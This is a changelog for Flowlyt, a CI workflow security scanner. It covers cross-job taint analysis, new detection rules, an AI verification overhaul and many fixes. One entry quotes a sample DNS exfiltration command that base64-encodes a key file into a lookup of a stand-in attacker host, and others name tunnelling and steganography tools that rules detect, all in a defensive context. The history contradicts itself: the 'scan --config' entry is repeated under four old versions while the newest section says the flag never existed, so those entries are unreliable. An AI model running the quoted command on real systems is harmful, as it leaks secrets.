# Changelog

All notable changes to Flowlyt will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

---

## [Unreleased]

### ✨ Added

- `scan --config` / `-c` to point at a configuration file explicitly.

### 🐛 Fixed

- **`scan` had no `--config` flag, so a configuration file could never be
  specified explicitly.** `config.LoadConfig` has always accepted a path, but
  `scan` never declared the flag and the loader was called with an empty
  string, restricting configuration to auto-discovery from the working
  directory and `$HOME`. `analyze-org` declared `--config` but discarded it
  the same way.

  `scan` now takes `--config` / `-c`, and both commands honour it. This also
  repairs the GitHub Action, which failed on **every default invocation**:
  `config-file` defaults to `.flowlyt.yml` and the action passed it as
  `--config`, so urfave/cli aborted with
  `flag provided but not defined: -config` before scanning anything. The only
  workaround was setting `config-file: ''`.

- **`enable-ast-analysis: true` aborted the scan** in the GitHub Action,
  appending an `--enable-ast-analysis` flag that has never existed. AST
  analysis and reachability filtering run unconditionally, so the input is
  now documented as deprecated and ignored.

- **The action reported wrong finding counts for three of four output
  formats.** For `cli` and `markdown` it grepped for `Found N issues` and
  `N Critical`, neither of which the v2 CLI emits — it prints
  `N finding(s)   a critical · b high` in lowercase. Counts silently fell back
  to empty strings, which then broke the `-gt` threshold comparisons with
  `integer expression expected`. `cli` output is now parsed from the real
  summary line with ANSI codes stripped, `markdown` from its summary table,
  and every count is coerced to an integer before comparison.

  For `sarif`, medium and low counts were derived from the SARIF `level`
  field, which maps MEDIUM and LOW both to `warning` and INFO to `note` — so
  low findings were reported as medium, and info as low. Counts now come from
  `properties.severity`, consistent with the critical and high counts.

- **`findings` serialised as `null` rather than `[]`** in JSON output when a
  scan found nothing, forcing every consumer to guard with `// []`. It is now
  always an array.

- **SARIF reported `tool.driver.version` as `1.0.8`** on every release since
  that version, because it was hardcoded. It is now sourced from
  `constants.AppVersion`.

- **`--help` advertised platforms and output formats that are rejected at
  runtime.** `--platform` listed `jenkins` and `azure`, neither of which
  passes validation; `--output` listed `yaml` and `table`, which do not
  exist, while omitting `cli` and `markdown`, which do.

---

## [2.1.0] - 2026-07-30

Flowlyt becomes an interprocedural supply chain analyzer: it now follows
attacker-controlled data across job boundaries and into local composite actions
and reusable workflows. Rule count grows from 95 to 115, the AI layer is
reworked, and scans are roughly 5x faster on a single core.

### ⚠️ Upgrade notes

These change observable behaviour. Nothing requires action for CLI users, but
anyone consuming Flowlyt as a library or parsing its output should read them.

- **Finding categories were unified.** `SECRETS_EXPOSURE` (plural) now emits as
  `SECRET_EXPOSURE`, and a lowercase `injection` value that was never a defined
  category now emits as `INJECTION_ATTACK` or `MALICIOUS_PATTERN`. If you filter
  findings by category downstream, drop any workaround matching both spellings
  and stop matching the removed values. `rules.SecretsExposure` remains as a
  deprecated alias so existing Go importers still compile.
- **`ai.Client.VerifyBatch` changed signature** from `[]rules.Finding` to
  `[]ai.ContextualFinding`, so each finding can carry the workflow context the
  model needs. This only affects code implementing a custom AI client.
- **AI verdicts are now acted on.** With `--ai`, findings the model confidently
  judges false positives are demoted to `INFO` by default rather than reported
  unchanged. Set `--ai-fp-confidence 0` to restore annotate-only behaviour.
- **Five rules were removed** as redundant with existing coverage:
  `OBFUSCATED_BASE64_INJECTION`, `VARIABLE_INDIRECTION_INJECTION`,
  `COMMAND_SUBSTITUTION_INJECTION`, `TUNNELING_EXFILTRATION`, and
  `ENCODED_EXFILTRATION`. Each fired only on lines already reported by another
  rule; the coverage they did add uniquely was folded into
  `MALICIOUS_DATA_EXFILTRATION`.

### 🔒 Security

- Updated `go.opentelemetry.io/otel` and friends to v1.44.0, clearing
  GO-2026-5426 and GO-2026-5158, and `golang.org/x/crypto` to v0.54.0.
  `govulncheck` reports no vulnerabilities in imported packages.
  One advisory remains in a required module (GO-2026-5932 in `x/crypto`) with no
  fixed version released; it is not reachable from this code.
- Dockerfile base images are now pinned by digest. Flowlyt ships an
  `UNPINNED_CONTAINER_IMAGE` rule for exactly this, so its own image should
  comply.


### 🔑 Fine-grained PAT detection

`HARDCODED_SECRET` now detects fine-grained personal access tokens
(`github_pat_`). Only the classic formats (`ghp_`, `gho_`, `ghu_`, `ghs_`,
`ghr_`) were covered, so GitHub's recommended token type — in wide use since
2022 — was missed entirely unless it happened to sit next to a `token:` key
that a generic key-value pattern matched. A bare token, for example in an
`Authorization: Bearer` header, was not detected at all.

The length is matched permissively rather than pinned to an exact character
count: the `github_pat_` prefix is already highly specific, and a missed
credential is worse than a loose match.

### ⚡ Literal pre-filtering and cache ownership

New `pkg/matcher` provides an Aho-Corasick automaton for the common pattern of
gating an expensive regular expression behind a set of cheap literal checks.
The secret-detection rule declares 55 anchor literals across 22 patterns;
checking each with `strings.Contains` meant up to 55 full scans of the content,
and those scans all run to completion precisely in the common case where a
workflow contains none of them. One pass now answers the whole question.

The first implementation stored children in a map per node and measured
*slower* than the naive approach, because Go's `strings.Contains` is
SIMD-optimised while a map lookup per input byte is not. Folding failure links
into a flat transition table makes matching one array index per byte, which is
3.1x faster than the brute-force scan (925ns vs 2857ns on a representative
workflow). Both implementations were validated against a brute-force reference
over randomised inputs, and a differential test asserts the automaton path and
the reference `mayMatch` semantics agree exactly.

`LineMapper` memoisation is now an ownable `MapperCache` value rather than loose
package-level maps. `linenum.DefaultCache()` exposes the instance backing
`NewLineMapper` so a caller can bound its lifetime; the scan command now resets
it on completion, which matters for the organization command that scans many
repositories in sequence. Eviction drops a single entry instead of clearing
wholesale, which previously discarded the workflow being scanned along with
everything else. A nil cache is valid and simply does not memoise.

### 🕸️ Cross-job taint analysis

Flowlyt now models a workflow's jobs as a dependency graph and propagates taint
across it, closing a gap that every existing rule missed.

**`CROSS_JOB_TAINT` (CRITICAL)** detects attacker-controlled data written into a
job output by one job and executed by a dependent job. Neither job is dangerous
in isolation — the first only reads an issue title into an output, the second
only echoes a value from `needs` — so a per-step or per-job analysis sees
nothing. The vulnerability exists in the edge between them, and the consuming
job is frequently the privileged one, because the pattern is often used
deliberately to move data from an unprivileged collector into a job holding
write permissions.

New package `pkg/analysis/jobgraph`:

- builds the `needs:` DAG in O(V + E), tolerating dangling dependencies
- orders jobs with **Kahn's algorithm**, chosen over a DFS sort because it
  detects dependency cycles as a by-product; ties break on job ID so the order
  is deterministic rather than dependent on Go's randomised map iteration
- propagates taint **in topological order**, which guarantees every input to a
  job is resolved before the job is examined — so one pass suffices and no
  iteration to a fixpoint is needed
- terminates on cyclic `needs:` (GitHub rejects such workflows, but a file on
  disk can still contain one) and reports nothing for the cyclic component

Taint is traced through arbitrarily long chains, so a value laundered through
intermediate forwarding jobs is still caught, and findings show the full path
(`collect → forward → publish`) plus the originating expression.

Precision was prioritised over reach: only known attacker-controllable contexts
taint (`github.event.issue.*`, `.pull_request.*`, `.comment.*`, `head_ref`, and
similar), so `github.sha` and `github.event.repository.name` do not. Values
passed through `env:` — the recommended fix — are not reported, nor are tainted
outputs no downstream job consumes, nor flows confined to a single job.

Known limitation: taint passing through a third-party action that sets an output
is not tracked, since the action's definition is not resolved. Composite action
resolution would close this.

### 🔗 Cross-file resolution

**`CROSS_FILE_TAINT` (CRITICAL)** follows `uses:` into local composite actions
and reusable workflows, so taint no longer stops at the file boundary. The
calling workflow looks clean because it only passes a parameter; the callee
looks clean because it only uses its own declared input. The vulnerability is
the composition, and no single-file rule can see it.

New package `pkg/analysis/resolve` loads the definition behind a local `uses:`,
extracts its declared inputs, and reports which of them reach an execution sink.
Findings name both sides — the caller line, the untrusted source, the resolved
file, and the line inside that file where execution happens.

Deliberately bounded:

- only repository-local targets are resolved; remote actions would require
  fetching another repository and are left to the supply chain rules
- only **composite** actions are followed, since JavaScript and Docker actions
  execute code that is not readable from the manifest
- only inputs reaching an execution sink are reported, so an input used as an
  artifact name is not flagged
- `uses:` is treated as untrusted repository data: references escaping the
  repository root (`./../../etc`) are refused rather than followed, so the
  analyzer cannot be induced to read arbitrary files. There is a test for this.

Definitions are cached per scan, including negative results, because the same
action is commonly referenced by many workflows in a repository.

### 🤖 AI analysis overhaul

The AI layer produced poor results and a poor experience for three structural
reasons, all now fixed.

**The model could not see the workflow.** Findings were sent with only a rule ID,
severity, job/step names, and evidence truncated to 600 characters. Yet the
prompts asked the model to judge things like "is this action used in a privileged
job (write permissions, access to secrets)" and "trigger × job permissions × step
actions" — while the permissions were never in the payload. Asked questions its
input could not answer, a model guesses, and one that is also asked for a
confidence score returns confident fabrication.

Each finding now carries:

- the workflow's triggers, showing whether an untrusted actor can reach the code
- workflow- and job-level `permissions`, with `not set` (inherits a
  possibly-write repository default) distinguished from `{}` (grants nothing)
- the job's dependencies and runner
- the **full** `run:` script and `uses:` clause, not a truncated fragment
- a numbered source snippet centred on the reported line, marked with `>`

The system prompts were rewritten to reference only evidence that is actually
supplied, and to instruct the model to return a confidence at or below 0.5 when
the evidence is insufficient rather than guessing.

**Requests ran one at a time.** `--ai-workers` was documented but had never been
implemented — no such flag existed, and `AnalyzeFindings` dispatched batches in a
plain nested loop. A hundred findings meant twenty sequential round-trips, a
stall of roughly a minute behind a single-line progress indicator. Batches are
now dispatched concurrently through a worker pool (`--ai-workers`, default 4),
with results reassembled by batch index so output stays deterministic. In a
benchmark of eight 50 ms batches, wall time dropped from ~400 ms to ~100 ms.

Timeouts were also restructured. One deadline was previously derived from the
total finding count, so a slow early batch consumed the budget for every batch
after it, and the per-finding fallback path inherited an already-exhausted
deadline. Each batch, and each fallback request, now gets its own.

**The verdict changed nothing.** `AISuggestedSeverity` was stored and written to
SARIF but never applied, and `AILikelyFalsePositive` never filtered or reordered
anything: a finding judged a false positive at 95% confidence was reported
unchanged. Verdicts are now acted on:

- `--ai-fp-confidence` (default `0.8`) sets the threshold; `0` restores
  annotate-only behaviour
- confident false positives are **demoted to `INFO`** by default, because a
  model's judgement should not silently delete a security finding
- `--ai-suppress-fp` opts into dropping them instead
- `--ai-apply-severity` lets the model re-rank true positives; an unrecognised
  severity string is ignored rather than defaulted
- a summary line reports how many findings were suppressed, demoted, or
  re-severitied

### ✨ New input type: Dependabot

- Flowlyt now audits `.github/dependabot.yml` as a first-class input type,
  discovered automatically for both local (`--repo`) and remote (`--url`) scans.
  Because its schema shares nothing with a CI workflow, it runs through its own
  parser and rule set rather than being coerced into the workflow model.
  - `DEPENDABOT_COOLDOWN_MISSING` (MEDIUM) — missing `cooldown`, or one shorter
    than the recommended 7 days. Package compromises are typically opportunistic
    and yanked within days, so a cooldown avoids the exposure window entirely.
  - `DEPENDABOT_INSECURE_EXECUTION` (HIGH) — `insecure-external-code-execution:
    allow`, which lets a compromised dependency execute inside a Dependabot job
    that holds repository and private-registry credentials.
- New `--no-dependabot` flag to skip it. A malformed file warns rather than
  failing the scan; a repository with no Dependabot config is a normal state and
  produces no findings.

### 🛡️ New security rules

Supply chain integrity:

- `REF_VERSION_MISMATCH` (HIGH, online) — a SHA-pinned action whose `# vX.Y.Z`
  comment does not match the commit that tag actually points to. Reviewers judge
  pins by the comment, so a mismatch is a potent social-engineering vector; it
  also catches version bumps that updated the comment but not the SHA.
- `UNPINNED_CONTAINER_IMAGE` (MEDIUM/LOW) — `container:`, `services:`, and
  `uses: docker://` images not pinned by `@sha256:` digest. Correctly
  distinguishes registry ports (`registry:5000/app`) from tags.
- `ARCHIVED_ACTION_SOURCE` (MEDIUM, online) — actions from archived repositories,
  which can never receive security fixes.
- `UNPINNED_TOOL_INSTALL` (MEDIUM) — `go install …@latest`, unpinned
  `cargo install`, `pipx install`, and `npm install -g`.
- `ADHOC_PACKAGE_INSTALL` (LOW) — dependencies installed outside a committed
  lockfile.

Credential scope:

- `HARDCODED_CONTAINER_CREDENTIALS` (CRITICAL) — literal registry password in
  `container.credentials` or `services.<name>.credentials`. Values are redacted
  in report output.
- `SECRETS_OUTSIDE_ENV` (MEDIUM) — `${{ secrets.X }}` interpolated directly into
  a `run:` script instead of passed via `env:`. `GITHUB_TOKEN` is exempt.
- `GITHUB_APP_TOKEN_MISUSE` (MEDIUM, HIGH when owner-wide) — App installation
  tokens requested with `skip-token-revoke`, without `repositories:`, or without
  any `permission-*` narrowing.

Configuration hygiene:

- `INSECURE_URL_SCHEME` (MEDIUM) — plaintext `http://` in `run:`, action inputs,
  and `env:`. Excludes loopback, link-local, and XML-namespace/licence URLs.
- `CONCURRENCY_LIMITS_MISSING` (LOW) — externally re-triggerable workflows that
  do not cancel superseded runs. Schedule- and dispatch-only workflows are out
  of scope.
- `MISFEATURE` (LOW/MEDIUM) — `actions/checkout` with `submodules` or `ssh-key`,
  and `secrets: inherit` on a reusable workflow call.
- `ANONYMOUS_DEFINITION` (INFO) — workflow with no top-level `name:`.
- `UNDOCUMENTED_PERMISSIONS` (INFO) — a `write` scope granted with no
  explanatory comment.

Policy enforcement:

- `FORBIDDEN_USES` (HIGH, **opt-in**) — allowlist/denylist for `uses:` clauses,
  configured via `rules.forbidden_uses.allow` / `.deny`. Not registered at all
  until configured.

> `ANONYMOUS_DEFINITION` and `UNDOCUMENTED_PERMISSIONS` are `INFO` severity, so
> they are hidden at the default `--min-severity LOW`. Use
> `--min-severity INFO` to see them.

### 🐛 Fixes

- **Finding categories are now consistent.** The engine emitted two extra
  category values that were impossible to filter on reliably:
  - `SECRETS_EXPOSURE` (plural) and `SECRET_EXPOSURE` (singular) were both in
    use for the same concept, across 8 and 7 rules respectively. Code that
    matched only the singular form — including the recommendation counter in
    `pkg/report/policy_aware.go` — silently skipped every finding carrying the
    plural spelling. Both now emit `SECRET_EXPOSURE`.
  - The advanced injection and exfiltration rules emitted a raw lowercase
    `"injection"`, which is not a defined category at all, across 10 rules.
    These now emit `INJECTION_ATTACK`, matching their registered sibling
    `CREDENTIAL_EXFILTRATION`.

  `rules.SecretsExposure` is retained as a deprecated alias of
  `rules.SecretExposure` so existing importers still compile. In configuration
  files, `SECRETS_EXPOSURE` is still accepted for custom rules and normalises to
  `SECRET_EXPOSURE`.

  **Downstream impact:** if you filter findings by `Category`, you can drop any
  workaround that matched both spellings. Anything matching the literal strings
  `SECRETS_EXPOSURE` or `injection` must be updated.

- **Custom rules can now use every category.** `convertCategory` recognised only
  5 of the 10 categories, so a custom rule declaring `SUPPLY_CHAIN`,
  `INJECTION_ATTACK`, `ACCESS_CONTROL`, `PRIVILEGE_ESCALATION`, or
  `DATA_EXPOSURE` was rejected as invalid and silently filed under
  `MISCONFIGURATION`.

- **Removed two unsupported regex backreferences that panicked on
  construction.** `NewAdvancedInjectionDetector()` compiled patterns containing
  `\1`, which Go's RE2 engine rejects, so the constructor panicked outright.
  This never surfaced in practice only because the detector is not wired into
  any scan path. The same-variable check in `VARIABLE_INDIRECTION_INJECTION` and
  the delimiter match in `HEREDOC_INJECTION` are now performed in Go. The
  heredoc rule additionally no longer relies on `.` matching newlines (which it
  never did), and correctly treats a quoted delimiter (`<<'EOF'`) as safe.

- **False-positive filter no longer swallows `@latest` findings.** Ignore
  *strings* were matched with a bare prefix/suffix test, so any finding whose
  evidence merely ended with the letters `test` was silently discarded — which
  includes anything referencing `@latest`, `ubuntu-latest`, or `:latest`, since
  the default ignore list contains `"test"`. This suppressed genuine findings
  from `UNPINNED_ACTION`, `UNPINNED_CONTAINER_IMAGE`, `UNPINNED_TOOL_INSTALL`
  and others. Matching now respects word boundaries, so `my_test` still matches
  while `actions/checkout@latest` no longer does. Use an ignore *pattern*
  (a regex) if you need the old substring behaviour.

### ♻️ Activated previously dead detection code

Ten rules existed in the source but were unreachable — the detectors that emit
them were never constructed, so they had never produced a finding. Each was
assessed against the rules that actually run, and the code was rewritten rather
than simply wired up.

**Five now ship**, covering techniques nothing else detected:

- `DNS_EXFILTRATION` (HIGH) — data encoded into a DNS query: a hostname built by
  command substitution, an expression used as a subdomain label, or a
  DNS-over-HTTPS resolver carrying an expression. The existing exfiltration rule
  only matched simple `$VAR` interpolation, so `nslookup "$(cat key | base64).evil.example"`
  passed cleanly.
- `STEGANOGRAPHIC_EXFILTRATION` (MEDIUM) — `steghide embed` and friends, and
  secrets written into image metadata. Previously undetected entirely.
- `COVERT_CHANNEL_EXFILTRATION` (MEDIUM) — ICMP hex payloads, sleep durations
  derived from untrusted input, and expression-derived transfer sizes.
  Previously undetected entirely.
- `HEREDOC_INJECTION` (HIGH) — an unquoted heredoc whose body interpolates an
  expression. A quoted delimiter (`<<'EOF'`) is correctly treated as safe.
- `MULTI_STAGE_INJECTION` (HIGH) — an expression written to a file that is later
  executed. Requires the *same* path, so writing a log and running an unrelated
  script is not reported.

**Five were dropped as redundant.** `OBFUSCATED_BASE64_INJECTION`,
`VARIABLE_INDIRECTION_INJECTION` and `COMMAND_SUBSTITUTION_INJECTION` fired on
lines already reported by `INJECTION_VULNERABILITY`, `SHELL_INJECTION`,
`SHELL_EVAL_USAGE` and `MALICIOUS_BASE64_DECODE`; a second rule on the same line
adds noise, not information. `TUNNELING_EXFILTRATION` and `ENCODED_EXFILTRATION`
were largely covered by `MALICIOUS_DATA_EXFILTRATION`, so its patterns were
extended instead to close the remaining holes (`bore local`, localtunnel's `lt
--port` alias, and hex / URL-encoded pipes to the network).

The detectors were rebuilt on a shared, table-driven scanner. A technique is now
declared as data — patterns plus metadata — and the scanner supplies comment
stripping, line pinpointing, and deduplication, so covering a new technique is a
single table entry rather than a new bespoke scanning loop. Findings now carry
the correct file path and an exact line number within the `run:` block, which
the original code did not (it hardcoded line 0 and used the workflow *name* as
the path).

### 🔧 Internal

- `parser.Workflow` and `parser.Job` now parse the `concurrency:` field, which
  was previously discarded.
- Severities and categories in the advanced injection and exfiltration rules now
  use the typed constants instead of raw string literals, and are covered by a
  test asserting that every registered rule uses a defined category and
  severity.
- New GitHub API helpers: `ResolveRefSHA` (dereferences annotated tags to their
  target commit), `IsRepositoryArchived`, and `GetFileContent` (treats a missing
  file as a normal outcome rather than an error).

---

## [2.0.1] - 2026-06-09

### 💅 CLI output

- Reworked the default terminal report into a polished, semgrep-style layout:
  a colored title, per-file headers with finding counts, severity-marked
  findings, and a **pinpointed multi-line code snippet** with a line-number
  gutter (the offending line is marked and highlighted). Description / fix /
  AI notes now wrap to the terminal width with clean hanging indents.

### 🎯 Accuracy

- `IMPOSTOR_COMMIT`: a benign `git config user.name "github-actions[bot]"` is no
  longer reported as CRITICAL when the surrounding run block happens to contain
  `${...}`. Each run-block line is evaluated independently; the official bot
  identity is LOW and a variable-based identity is CRITICAL, each pinpointed to
  its exact line.
- `GITHUB_ENV_UNTRUSTED_WRITE`: now points at the exact `>> $GITHUB_ENV` line
  inside the run block instead of the `run:` block-scalar line.

## [2.0.0] - 2026-06-09

A major release focused on correctness, finding precision, and a cleaner CLI.

### 💥 Breaking / Notable

- **Module path is now `github.com/harekrishnarai/flowlyt/v2`** (Go semantic
  import versioning for v2+). Install with
  `go install github.com/harekrishnarai/flowlyt/v2/cmd/flowlyt@latest`; library
  importers must update their import paths to include `/v2`. The GitHub Action,
  Docker image, and release binaries are unaffected.
- **`--ref` replaces `--branch`.** You can now scan any git ref — a branch, a
  tag, or a commit SHA — and the file links point at that same ref. `--branch`
  is kept as a backward-compatible alias, so existing commands keep working.
- **Redesigned CLI output.** The default report is now a compact,
  scanner-style layout (in the spirit of semgrep/scorecard): findings grouped
  by file with the offending line, link, and a fix hint, plus a one-line
  summary. The ASCII banner, summary table, and multi-line boxes are gone.
  Machine formats (`json`, `sarif`, `yaml`, `markdown`) are unchanged.

### ✨ Features

- **Arbitrary ref scanning** — GitHub fetches workflow content at the requested
  ref via the contents API; GitLab uses `git clone --branch` for branches/tags
  and falls back to a full clone + `git checkout` for commit SHAs.
- **Homebrew install** — `brew install harekrishnarai/flowlyt/flowlyt`. The
  release workflow publishes a formula to the `homebrew-flowlyt` tap from the
  signed release binaries.

### 🎯 Accuracy & Precision

- **ArtiPACKED** (`ARTIPACKED_VULNERABILITY`) is now `HIGH` only when a job
  uploads an artifact that can include the `.git` directory; otherwise it is a
  `LOW` hardening note (previously every `actions/checkout` was `HIGH`).
- **`UNTRUSTED_TRIGGER`** (renamed from `EXTERNAL_TRIGGER_DEBUG`) —
  `workflow_dispatch` is now `INFO` (it requires repo write access to invoke).
- **AST data-flow** no longer flags normal secret→env/input propagation;
  findings use real source/sink names and resolve a line number.
- **Deduplication** collapses the same rule firing on the same file+line across
  jobs (e.g. one `uses:` line reported once), and the headline count now matches
  the JSON/SARIF output.
- `OIDC_WORKFLOW_LEVEL_PERMISSION` and AST findings now report real line numbers.

### 🐛 Bug Fixes

- Fixed a **Windows infinite loop** when scanning a single workflow outside a git repo.
- The scanner no longer **aborts on a templated boolean** (`continue-on-error: ${{ … }}`);
  a single unparseable workflow is skipped with a warning instead of failing the run.
- The organization summary is recalculated after AI verification, and the
  "top findings" aggregation is implemented (was an empty stub).
- AI analysis no longer floods the terminal — a single in-place progress line on
  a TTY, silent when piped; per-finding results appear in the final report.
- `Dockerfile` builds with Go 1.25 (matching `go.mod`) and bundles default policies correctly.

### 🧪 Tests

- New coverage for previously-untested packages (engine, opa, osv, platform
  adapters) plus regression tests for the parser, dedup, ArtiPACKED gating, and ref handling.

### 🧹 Internal

- Split the 4,784-line `pkg/rules/rules.go` into cohesive per-category files.

## [1.1.0] - 2026-03-27

### 🎉 Major Features

**AI Layer Redesign** — Three independent layers that reduce token cost, sharpen analysis quality, and deliver a modern streaming CLI experience

- **Heuristic Pre-filter** (`pkg/ai/filter.go`): Zero-cost Go pattern matching skips obvious false positives before any API call. Skips expression references (`${{ secrets.`, `${{ env.`), known placeholders, already-pinned SHA actions, and locked permissions. Always sends real token prefixes (`ghp_`, `sk-`, `AKIA`) and high-entropy blobs (Shannon ≥4.0 bits/char). Preserves existing `AI_MIN_SEVERITY` / `AI_INCLUDE_RULES` / `AI_EXCLUDE_RULES` env behaviour.
- **Class-Specific Prompt Templates** (`pkg/ai/prompt.go`): Four specialist system prompts replace the single generic template — `escalation` (privilege chain reasoning), `injection` (source→sink data flow), `secrets_context` (live credential vs placeholder), `supply_chain_trust` (trust context beyond pinning). Each ~150 tokens vs the old ~500-token generic prompt.
- **Batch Dispatcher** (`pkg/ai/analyzer.go`): Sends up to 5 findings per API call, grouped by class. Results attributed by echoed `index` field (no positional misattribution). Falls back to individual calls on batch failure. All 5 providers implement `VerifyBatch`.
- **Streaming UX**: Live progress bar (`🤖 AI analysis [████░░] 8/20`), per-finding result lines as batches resolve, `PrintAISummary` box at scan end with analyzed/skipped/true-pos/false-pos breakdown.

### ✨ Added

- `pkg/ai/filter.go` — `ShouldSkipAI` with Shannon entropy helper and env-based gate
- `pkg/ai/prompt.go` — `composeBatchPrompt`, `parseBatchResponse`, 4 class-specific + 1 generic system prompt
- `BatchVerificationResult{Index, Result, Error}` struct for index-echoed batch attribution
- `VerifyBatch` method on all 5 providers (Claude, OpenAI, Gemini, Grok, Perplexity)
- `AISkipped`, `AISkipReason`, `AIRemediation` fields on `rules.Finding`
- `SkippedByFilter` field on `AISummary`
- `PrintAISummary` renders summary box; `printFindingResult` streams per-finding output
- `ai.remediation`, `ai.skipped`, `ai.skip_reason` properties in SARIF output

### 🔧 Changed

- `shouldSendToAI` / worker goroutine pool replaced by `ShouldSkipAI` + synchronous batch loop
- `AIVerified` only set when AI actually ran (not for pre-filter skipped findings)
- Partial AI results returned on timeout — scan completes with warning instead of aborting
- `--ai-workers` flag removed (design is now synchronous per-class batching)
- `Remediation` field added to `VerificationResult` response schema

### 📊 Expected Impact

- ≥60% token spend reduction on scans with 20+ findings
- AI reasoning now cites specific evidence tokens (trigger × permission × step for escalation, source → sink for injection, etc.)
- Remediation suggestions surfaced in CLI output and SARIF for all true positives

[Full Details](changelogs/CHANGELOG-v1.1.0.md)

---

## [1.0.11] - 2026-03-27

### ✨ Added

- `scan --config` / `-c` to point at a configuration file explicitly.

### 🐛 Fixed

- **CACHE_WRITE_IN_PR_WORKFLOW**: Deduplicate findings across matrix-expanded jobs — one finding per `actions/cache` step instead of N
- **DANGEROUS_WRITE_OPERATION**: Deduplicate across matrix-expanded jobs, keyed per pattern
- **MATRIX_INJECTION**: Exempt arithmetic expansion context with static matrix values; `fromJSON(inputs.*)` sources still fire
- **SHELL_SCRIPT_ISSUES**: Exempt double-quoted `$VAR` in file-operation commands (`rm`, `cp`, `mv`, etc.); `eval`, `curl`, `wget` remain fully flagged
- **IMPOSTOR_COMMIT**: Downgrade severity from HIGH to LOW for known GitHub service bots (`github-actions[bot]`, `dependabot[bot]`)

### 🔧 Improved

- `knownBotRe` promoted to package-level compiled regex (avoids hot-loop recompilation)

[Full Details](changelogs/CHANGELOG-v1.0.11.md)

---

## [1.0.10] - 2026-03-19

### ✨ Added

- `scan --config` / `-c` to point at a configuration file explicitly.

### 🐛 Fixed

- **REF_CONFUSION**: Stable semver tags (`@v1`, `@v1.2.3`) no longer produce false positives; only genuinely mutable refs fire
- **EXTERNAL_TRIGGER_DEBUG**: `workflow_dispatch` suppressed for read-only permission scopes
- **SHELL_SCRIPT_ISSUES**: Broad unquoted-variable check replaced with precise per-line scan; variables in safe positions (`echo`, `printf`, `cat`) no longer flagged
- **Data flow analysis**: Fixed self-referential and cross-variable same-step false positive flows in taint engine

### 🔧 Improved

- `permsImplyWrite` handles all GitHub Actions permissions forms (nil, string shorthands, booleans, empty map, granular scope maps)
- `dangerousCmdRe` extended to match `sudo`-prefixed variants

[Full Details](changelogs/CHANGELOG-v1.0.10.md)

---

## [1.0.9] - 2026-03-17

### 🎉 Major Features

**Expression Taint Analysis + 11 New Rules** — 2024-2025 attack class coverage

- **Expression Taint Engine** (`pkg/analysis/ast/taint.go`): Tracks `${{ expr }}` through source → transform → sink. Env-var indirection is now correctly classified as safe, eliminating the root cause of injection false positives.
- **`workflow_run` trust boundary rules** (`WRT-001/002/003`): Detects artifact trust violations — the exact pattern used in the March 2025 tj-actions/reviewdog supply chain attack (CVE-2025-30066)
- **OIDC token abuse rules** (`OA-001/002`): Workflow-level `id-token: write` exposure and missing deployment environment scope
- **Cache poisoning rules** (`CP-001/002`): Broad `restore-keys` without `hashFiles` and cache writes in PR workflows
- **New injection sub-rules** (`EI-001/002/003`): `$GITHUB_ENV` untrusted write, memdump.py exfiltration signature, indirect PPE via build tools
- **`pull_request_target` 3-tier severity**: CRITICAL (head checkout) / MEDIUM (base checkout) / no finding (no checkout)

### ✨ Added

- `pkg/analysis/ast/taint.go` — ExprTaintTracker with 24 untrusted expression sources
- `pkg/rules/workflow_run_trust.go` — WRT-001/002/003
- `pkg/rules/oidc_abuse.go` — OA-001/002
- `pkg/rules/cache_poisoning.go` — CP-001/002
- Integration test fixtures (`testdata/workflows/`) with FP regression and detection tests

### ✨ Added

- `scan --config` / `-c` to point at a configuration file explicitly.

### 🐛 Fixed

- Env-var indirection false positive eliminated (taint engine)
- `pull_request_target` labelers/commenters no longer fire CRITICAL
- Duplicate cache findings (2× every finding) fixed
- EI-001/002/003 wired into StandardRules (were previously unreachable via normal scan)
- `classifyExpression` precedence for `workflow_run.head_commit.*` expressions

[Full Details](changelogs/CHANGELOG-v1.0.9.md)

---

## [1.0.8] - 2026-02-10

### 🎉 Major Features

**Context-Aware Analysis** - Revolutionary false positive reduction

- **50-60% false positive reduction** achieved (from 60-70% to 10-15%)
- Intelligent severity adjustment based on workflow context
- Workflow intent detection (ReadOnly, ReadWrite, Deploy, Release)
- Trigger risk assessment (CRITICAL to LOW based on trigger type)
- Permission analysis (actual needs vs. granted permissions)
- Dynamic severity adjustment while preserving 100% of critical findings
- Validated on 6 major open-source projects (968 total findings analyzed)

### ✨ Added

- `pkg/analysis/context/` - Complete context-aware analysis framework
  - `analyzer.go` - Unified context analysis and severity adjustment
  - `intent.go` - Workflow intent detection
  - `permissions.go` - Permission analysis
  - `triggers.go` - Trigger risk assessment
- Comprehensive documentation for context-aware analysis
- Token sanitization in git operations (`pkg/github/security.go`)

### 🔧 Changed

- Integrated context-aware analysis into RuleEngine
- Updated README with context-aware information
- Reorganized documentation into logical subdirectories
- Improved credential handling security

### 🧹 Cleaned

- Removed 192 lines of commented-out code
- Organized 36 documentation files into 5 subdirectories
- Removed temporary and redundant files (~655 KB saved)

### 📊 Results

- Test workflows: Appropriate severity downgrade (HIGH → MEDIUM)
- Release workflows: Strict security standards maintained
- Critical vulnerabilities: 100% preserved (zero false negatives)
- Multi-repo validation: 62% of findings appropriately MEDIUM/LOW
- Industry-leading: Best-in-class 10-15% false positive rate

[Full Details](changelogs/CHANGELOG-v1.0.8.md)

---

## [1.0.7] - 2026-01-15

### ✨ Added

- Code context in JSON and SARIF reports (#20)
- Line number mapping with 3-line context before/after
- Direct GitHub/GitLab URLs to exact line
- Enhanced SARIF integration for GitHub Security tab

### 🔧 Improved

- Faster remediation with immediate code context
- Better developer experience with less context switching
- Richer GitHub Security tab alerts

[Full Details](changelogs/CHANGELOG-v1.0.7.md)

---

## [1.0.6] - 2026-01-06

### ✨ Added

- `scan --config` / `-c` to point at a configuration file explicitly.

### 🐛 Fixed

- **Eliminated false positives for internal organization actions** (#19)
- Internal actions (same org) now treated as trusted
- Zero false positives for same-org actions

### 🔧 Changed

- `UNTRUSTED_ACTION_SOURCE` - Skips same-org actions
- `REPO_JACKING_VULNERABILITY` - Skips same-org actions
- `REF_CONFUSION` - Skips internal actions with `@main`/`@master`
- `UNPINNED_ACTION` - Skips internal actions

### 📊 Impact

- Reduced findings from 112 to 104 for org repos
- Maintained full security for external actions
- Improved developer experience for organizations

[Full Details](changelogs/CHANGELOG-v1.0.6.md)

---

## [1.0.5] - 2025-12-28

### ✨ Added

- Multi-platform support (GitHub Actions + GitLab CI/CD)
- GitLab CI/CD workflow scanning
- Platform-specific rule filtering
- Enhanced organization analysis

### 🔧 Improved

- Better error handling for remote repositories
- Improved progress reporting
